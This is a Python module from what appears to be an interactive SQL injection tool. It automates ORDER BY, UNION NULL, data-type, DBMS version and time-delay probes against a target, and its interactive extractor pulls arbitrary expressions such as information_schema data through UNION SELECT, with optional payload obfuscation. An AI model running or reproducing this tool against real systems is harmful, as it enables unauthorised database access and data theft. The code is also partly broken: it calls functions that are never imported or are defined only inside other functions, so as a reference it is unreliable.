import time
import concurrent.futures
from utils import to_int_safe, timed_send, _short_hash, sql_escape, parse_multi_indices, save_results
from payload_handlers import expand_single_payload_string
from obfuscator import Obfuscator

def run_column_counter(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return
    print("\n=== Column Count Helper ===")
    print("1) ORDER BY test")
    print("2) UNION NULL test")
    print("3) Error-based test")
    print("9) Back")
    sel = input("> ").strip()
    if sel in ("9", "۹"):
        return

    max_cols = 50
    comment_styles = ["-- ", "#", "/* */"]
    with_quotes = [True, False]

    def _send_payload(p):
        built = ic.prepare_injection(p)
        if not built:
            return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((lbl, None, None, None, None))
                continue
            body = r.text or ""
            rows.append((lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows

    if sel == "1":
        print("\n[ORDER BY scan]")
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for com in comment_styles:
                for q in with_quotes:
                    for i in range(1, max_cols+1):
                        payload = (f"' ORDER BY {i}{com}" if q else f" ORDER BY {i}{com}")
                        future = executor.submit(_send_payload, payload)
                        futures.append((future, i))
            for future, i in futures:
                rows = future.result()
                if not rows:
                    print(f"[i={i}] send failed.")
                    continue
                sample = rows[0] if rows else None
                if sample:
                    print(f"[i={i}] -> status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")
                results.extend(rows)
        save_results(results, f"orderby_results_{int(time.time())}.json")

    elif sel == "2":
        print("\n[UNION NULL scan]")
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for com in comment_styles:
                for q in with_quotes:
                    for i in range(1, max_cols+1):
                        nulls = ",".join(["NULL"]*i)
                        payload = (f"' UNION SELECT {nulls}{com}" if q else f" UNION SELECT {nulls}{com}")
                        future = executor.submit(_send_payload, payload)
                        futures.append((future, i))
            for future, i in futures:
                rows = future.result()
                if not rows:
                    print(f"[cols={i}] send failed.")
                    continue
                sample = rows[0] if rows else None
                if sample:
                    print(f"[cols={i}] -> status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")
                results.extend(rows)
        save_results(results, f"union_null_results_{int(time.time())}.json")

    elif sel == "3":
        print("\n[Error-based scan]")
        error_payloads = load_custom_payloads().get("lists", {}).get("error_based", {}).get("payloads", [])
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(_send_payload, p) for p in error_payloads]
            for future in concurrent.futures.as_completed(futures):
                rows = future.result()
                if not rows:
                    print("[Error-based] send failed.")
                    continue
                sample = rows[0]
                print(f"[Error-based] -> status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")
                results.extend(rows)
        save_results(results, f"error_based_results_{int(time.time())}.json")

def run_datatype_tester(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(input("Number of columns in UNION: ").strip())
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    qneed = input("Does value need quotes? 1(yes)/0(no): ").strip()
    with_quotes = (qneed in ("1", "۱", "yes", "y"))

    tests = {
        "string": "'dmDyCT'",
        "int": "123",
        "float": "3.14",
        "bool": "TRUE",
        "time": "2024-01-01",
        "null": "NULL"
    }
    comment_styles = ["-- ", "#", "/* */"]

    def _send_payload(p):
        built = ic.prepare_injection(p)
        if not built:
            return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((lbl, None, None, None, None))
                continue
            body = r.text or ""
            rows.append((lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for com in comment_styles:
            for dtype, val in tests.items():
                for i in range(col_count):
                    cols = ["NULL"] * col_count
                    cols[i] = val
                    pay = f"UNION SELECT {','.join(cols)}{com}"
                    if with_quotes:
                        pay = "'" + " " + pay
                    futures.append(executor.submit(_send_payload, pay))
        for future in concurrent.futures.as_completed(futures):
            rows = future.result()
            if not rows:
                print(f"[col {i+1}] send failed.")
                continue
            sample = rows[0]
            print(f"[col {i+1}] status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")
            results.extend(rows)
        save_results(results, f"datatype_tester_results_{int(time.time())}.json")

def run_version_probe(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(input("Number of columns in UNION: ").strip())
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    qneed = input("Does value need quotes? 1(yes)/0(no) [default 1]: ").strip()
    need_quotes = (qneed in ("", "1", "۱", "yes", "y"))

    enable_time_input = validate_input("Enable time-based probe? (y/n) [y]: ", "str", default="y")
    enable_time = enable_time_input in ("y", "yes")

    threshold = 5.0
    tb_sec = 5
    if enable_time:
        threshold = float(validate_input("Time threshold for delay (seconds) [5.0]: ", "float", default="5.0"))
        tb_sec = int(validate_input("Delay seconds for time probe [5]: ", "int", default="5"))

    print("\nSelect DBMS to probe (comma-separated indices, 'all', or blank for generic):")
    dbms_names = list(Obfuscator().dbms_config.keys())
    for i, name in enumerate(dbms_names, 1):
        print(f"{i}. {name}")
    sel = input("> ").strip().lower()
    if sel == "all":
        chosen = dbms_names
    else:
        try:
            indices = parse_multi_indices(sel, len(dbms_names))
            chosen = [dbms_names[i-1] for i in indices]
        except:
            chosen = []
    if not chosen:
        chosen = ["generic"]
        print("[*] Using generic.")

    use_comment_styles = ["-- ", "#", "/* */"]

    def _req_builder(p):
        return ic.prepare_injection(p)

    def _send_and_measure(builder, label, pay):
        built = builder(pay)
        if not built:
            return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((label, lbl, None, None, None, 0.0))
                continue
            body = r.text or ""
            rows.append((label, lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows

    def _print_rows(rows):
        for row in rows:
            print(f"{row[0]} {row[1]} -> status={row[2]} len={row[3]} hash={row[4]} time={row[5]:.3f}s")

    results = []

    print("\n[+] DBMS-specific probes")
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for name in chosen:
            obf = Obfuscator(name)
            comment_pool = list(dict.fromkeys(use_comment_styles + obf.dbms_config[name]["comment_style"]))

            for com in comment_pool:
                vexpr = obf.dbms_config[name]["functions"]["version"][0] if "functions" in obf.dbms_config[name] else "@@version"
                cols = [vexpr] + ["NULL"] * (col_count - 1)
                core = f"SELECT {','.join(cols)}"
                pay = f"UNION {core}"
                pay = ("' " + pay) if need_quotes else (" " + pay)
                pay += com
                futures.append(executor.submit(_send_and_measure, _req_builder, f"[{name}][version-probe:{com.strip()}]", pay))

            if enable_time:
                for com in comment_pool:
                    time_expr = obf.dbms_config[name]["time_func"].format(tb_sec)
                    cols = [time_expr] + ["NULL"] * (col_count - 1)
                    core = f"SELECT {','.join(cols)}"
                    pay = f"UNION {core}"
                    pay = ("' " + pay) if need_quotes else (" " + pay)
                    pay += com
                    futures.append(executor.submit(_send_and_measure, _req_builder, f"[{name}][time-probe:{com.strip()}]", pay))

        for future in concurrent.futures.as_completed(futures):
            rows = future.result()
            _print_rows(rows)
            for row in rows:
                if enable_time and row[5] >= threshold:
                    print(f"  -> DELAY detected (time={row[5]:.3f}s >= {threshold}s)")
            results.extend(rows)

    print("\n[+] ORDER BY scan (generic, no DBMS-lock-in)")
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for com in use_comment_styles:
            for i in range(1, col_count + 1):
                pay = f"ORDER BY {i}"
                pay = ("' " + pay) if need_quotes else (" " + pay)
                pay += com
                futures.append(executor.submit(_send_and_measure, _req_builder, f"[ORDERBY i={i}:{com.strip()}]", pay))
        for future in concurrent.futures.as_completed(futures):
            rows = future.result()
            _print_rows(rows)
            results.extend(rows)

    print("\n[+] UNION NULL scan (generic)")
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for com in use_comment_styles:
            for i in range(1, col_count + 1):
                nulls = ",".join(["NULL"] * i)
                pay = f"UNION SELECT {nulls}"
                pay = ("' " + pay) if need_quotes else (" " + pay)
                pay += com
                futures.append(executor.submit(_send_and_measure, _req_builder, f"[UNION-NULL cols={i}:{com.strip()}]", pay))
        for future in concurrent.futures.as_completed(futures):
            rows = future.result()
            _print_rows(rows)
            results.extend(rows)

    save_results(results, f"version_probe_results_{int(time.time())}.json")
    print("\n[Done] Advanced column-count scans finished. Review status/len/hash/time and decide manually.")

def run_db_info_interactive(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(input("Number of columns in UNION: ").strip())
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    qneed = input("Does value need quotes? 1(yes)/0(no) [default 1]: ").strip()
    with_quotes = (qneed in ("", "1", "۱", "yes", "y"))

    print("\nSelect DBMS for query building (or leave blank for generic):")
    dbms_names = list(Obfuscator().dbms_config.keys())
    for i, name in enumerate(dbms_names, 1):
        print(f"  {i}. {name}")
    sel = input("> ").strip().lower()
    dbms = "generic"
    if sel:
        try:
            idx = int(sel) - 1
            if 0 <= idx < len(dbms_names):
                dbms = dbms_names[idx]
        except:
            print("[-] Invalid DBMS selection. Using generic.")
    
    obf = Obfuscator(dbms)
    comment_styles = obf.dbms_config[dbms]["comment_style"]

    print("\nEnter information to extract (e.g., table_name, column_name, version()):")
    info_expr = input("> ").strip()
    if not info_expr:
        print("[-] No expression provided.")
        return

    print("\nEnter table to query (e.g., information_schema.tables, blank for none):")
    table = input("> ").strip() or None

    print("\nEnter WHERE condition (e.g., table_schema='public', blank for none):")
    where = input("> ").strip() or None

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for com in comment_styles:
            cols = [info_expr] + ["NULL"] * (col_count - 1)
            core = f"SELECT {','.join(cols)}"
            if table:
                core += f" FROM {table}"
            if where:
                core += f" WHERE {where}"
            pay = f"UNION {core}"
            pay = ("' " + pay) if with_quotes else (" " + pay)
            pay += com
            apply_obf = input(f"Apply obfuscation to payload '{pay}'? (y/n) [default n]: ").strip().lower()
            if apply_obf in ("y", "yes"):
                pay, tech = obf.obfuscate_advanced(pay, char_budget=100, dbms=dbms)
                print(f"[*] Obfuscated payload: {pay} (techniques: {', '.join(tech)})")
            futures.append(executor.submit(_send_and_measure, lambda x: ic.prepare_injection(x), f"[DB-INFO:{info_expr}:{com.strip()}]", pay))
        
        for future in concurrent.futures.as_completed(futures):
            rows = future.result()
            _print_rows(rows)
            results.extend(rows)

    save_results(results, f"db_info_results_{int(time.time())}.json")
    print("\n[Done] DB info scan finished. Review results in the JSON file.")

def run_column_counter_advanced(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(validate_input("Max columns to test [50]: ", "int", default="50"))
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    need_quotes_input = validate_input("Does value need quotes? 1(yes)/0(no) [1]: ", "str", default="1")
    need_quotes = need_quotes_input in ("1", "yes", "y")

    enable_time_input = validate_input("Enable time-based probe? (y/n) [y]: ", "str", default="y")
    enable_time = enable_time_input in ("y", "yes")

    threshold = 5.0
    tb_sec = 5
    if enable_time:
        threshold = float(validate_input("Time threshold for delay (seconds) [5.0]: ", "float", default="5.0"))
        tb_sec = int(validate_input("Delay seconds for time probe [5]: ", "int", default="5"))

    print("\nSelect DBMS to probe (comma-separated indices, 'all', or blank for generic):")
    dbms_names = list(Obfuscator().dbms_config.keys())
    for i, name in enumerate(dbms_names, 1):
        print(f"{i}. {name}")
    sel = validate_input("> ", "str", default="")
    if sel.lower() == "all":
        chosen = dbms_names
    else:
        try:
            indices = parse_multi_indices(sel, len(dbms_names))
            chosen = [dbms_names[i-1] for i in indices]
        except:
            chosen = []
    if not chosen:
        chosen = ["generic"]
        print("[*] Using generic.")

    use_comment_styles = ["-- ", "#", "/* */"]

    def _req_builder(p):
        return ic.prepare_injection(p)

    def _send_and_measure(builder, label, pay):
        built = builder(pay)
        if not built:
            return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((label, lbl, None, None, None, 0.0))
                continue
            body = r.text or ""
            rows.append((label, lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows

    def _print_rows(rows):
        for row in rows:
            print(f"{row[0]} {row[1]} -> status={row[2]} len={row[3]} hash={row[4]} time={row[5]:.3f}s")

    results = []

    print("\n[+] DBMS-specific probes")
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for name in chosen:
            obf = Obfuscator(name)
            comment_pool = list(dict.fromkeys(use_comment_styles + obf.dbms_config[name]["comment_style"]))

            # Version probe via UNION
            for com in comment_pool:
                vexpr = obf.dbms_config[name]["functions"]["version"][0] if "functions" in obf.dbms_config[name] else "@@version"
                cols = [vexpr] + ["NULL"] * (col_count - 1)
                core = f"SELECT {','.join(cols)}"
                pay = f"UNION {core}"
                pay = ("' " + pay) if need_quotes else (" " + pay)
                pay += com
                futures.append(executor.submit(_send_and_measure, _req_builder, f"[{name}][version-probe:{com.strip()}]", pay))

            if enable_time:
                for com in comment_pool:
                    time_expr = obf.dbms_config[name]["time_func"].format(tb_sec)
                    cols = [time_expr] + ["NULL"] * (col_count - 1)
                    core = f"SELECT {','.join(cols)}"
                    pay = f"UNION {core}"
                    pay = ("' " + pay) if need_quotes else (" " + pay)
                    pay += com
                    futures.append(executor.submit(_send_and_measure, _req_builder, f"[{name}][time-probe:{com.strip()}]", pay))

        for future in concurrent.futures.as_completed(futures):
            rows = future.result()
            _print_rows(rows)
            for row in rows:
                if enable_time and row[5] >= threshold:
                    print(f"  -> DELAY detected (time={row[5]:.3f}s >= {threshold}s)")
            results.extend(rows)

    print("\n[+] ORDER BY scan (generic, no DBMS-lock-in)")
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for com in use_comment_styles:
            for i in range(1, col_count + 1):
                pay = f"ORDER BY {i}"
                pay = ("' " + pay) if need_quotes else (" " + pay)
                pay += com
                futures.append(executor.submit(_send_and_measure, _req_builder, f"[ORDERBY i={i}:{com.strip()}]", pay))
        for future in concurrent.futures.as_completed(futures):
            rows = future.result()
            _print_rows(rows)
            results.extend(rows)

    print("\n[+] UNION NULL scan (generic)")
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for com in use_comment_styles:
            for i in range(1, col_count + 1):
                nulls = ",".join(["NULL"] * i)
                pay = f"UNION SELECT {nulls}"
                pay = ("' " + pay) if need_quotes else (" " + pay)
                pay += com
                futures.append(executor.submit(_send_and_measure, _req_builder, f"[UNION-NULL cols={i}:{com.strip()}]", pay))
        for future in concurrent.futures.as_completed(futures):
            rows = future.result()
            _print_rows(rows)
            results.extend(rows)

    save_results(results, f"advanced_column_count_results_{int(time.time())}.json")
    print("\n[Done] Advanced column-count scans finished. Review status/len/hash/time and decide manually.")